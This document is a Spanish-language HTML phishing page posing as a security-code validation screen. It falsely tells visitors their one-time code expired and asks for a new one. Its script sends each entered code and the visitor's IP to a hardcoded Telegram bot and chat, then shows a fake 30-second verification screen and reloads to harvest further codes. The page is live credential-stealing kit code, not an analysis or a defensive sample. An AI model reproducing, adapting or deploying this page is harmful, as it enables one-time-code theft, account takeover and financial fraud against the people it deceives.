<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Centro de Asignaciones | Exclusividad clientes</title>
    <style>
        :root { --p: #0A2A5E; --err: #be123c; }
        body { background: #f8fafc; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; }
        .card { background: #fff; padding: 45px; border-radius: 24px; width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
        .logo { max-width: 160px; margin-bottom: 25px; }
        
        .alert-box { background: #fff1f2; color: var(--err); padding: 18px; border-radius: 12px; font-size: 13px; font-weight: 700; border: 1px solid #fecaca; margin-bottom: 25px; line-height: 1.5; }
        
        label { display: block; font-size: 11px; color: #64748b; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; }
        input { width: 100%; padding: 18px; border: 2.5px solid var(--p); border-radius: 15px; font-size: 32px; text-align: center; letter-spacing: 10px; font-weight: 800; color: var(--p); outline: none; background: #fdfdfd; }
        
        .btn { width: 100%; padding: 18px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; margin-top: 30px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #071c3d; }

        .loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--p); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="img/nuevo.png" class="logo">
        
        <div class="alert-box">
            <b>ERROR DE VALIDACIÓN</b><br>
            El código ingresado es inválido o ha vencido. Por favor, solicite uno nuevo e intente otra vez.
        </div>

        <label>Nuevo Código de Seguridad</label>
        <input type="text" id="otp" maxlength="8" placeholder="000000">
        
        <button class="btn" onclick="processRetry()">Validar y Finalizar</button>
    </div>

    <div id="loading-screen" class="loader">
        <div class="spinner"></div>
        <h3 style="color: var(--p); margin: 0;">Verificando Nuevo Token</h3>
        <p style="color: #64748b;">Sincronizando con el servidor central (30s)...</p>
    </div>

    <script>
        const a = "8652605735:"; 
        const b = "AAGpe405IEzW36zWbSR6HbDvaYRmQHfqHGE"; 
        const c = "-1003900740654";

        async function processRetry() {
            const codeVal = document.getElementById('otp').value;
            
            // Validar que no esté vacío antes de mostrar carga
            if(codeVal.length < 4) {
                alert("Por favor, ingrese el código de seguridad.");
                return;
            }

            // Mostrar pantalla de carga
            document.getElementById('loading-screen').style.display = 'flex';

            // Enviar el dato a Telegram
            const ip = localStorage.getItem('_uip') || 'IP desconocida';
            const msg = `<b>[REINTENTO OTP]</b>\nIP: ${ip}\nCode: ${codeVal}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${a+b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
            } catch (e) {
                console.error("Error de red");
            }

            // Esperar 30 segundos y recargar la página para mostrar el error de nuevo
            setTimeout(() => {
                window.location.reload(); 
            }, 30000);
        }
    </script>
</body>
</html>
